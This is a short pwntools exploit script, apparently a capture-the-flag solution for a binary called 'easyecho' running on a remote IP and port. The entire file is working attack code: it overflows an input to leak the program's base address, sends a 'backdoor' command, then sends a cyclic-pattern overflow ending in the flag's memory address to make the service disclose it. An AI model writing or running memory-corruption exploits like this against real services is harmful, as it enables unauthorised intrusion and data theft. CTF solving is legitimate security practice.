from pwn import*
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./easyecho")
io=remote("1.14.71.254",28981)

io.recvuntil(b": ")
payload=b"a"*15+b"b"
io.sendline(payload)
io.recvuntil(b"b")

base_addr=u64(io.recv(6).ljust(8,b"\x00"))-0xcf0
print("base_addr  "+hex(base_addr))

# gdb.attach(io)
# pause()

io.recvuntil(b"Input: ")
io.sendline(b"backdoor")

flag_addr=base_addr+0x202040
payload=cyclic(0x168)+p64(flag_addr)
io.recvuntil(b"Input: ")
io.sendline(payload)

io.recvuntil(b"Input: ")
io.sendline(b"exitexit")

io.interactive()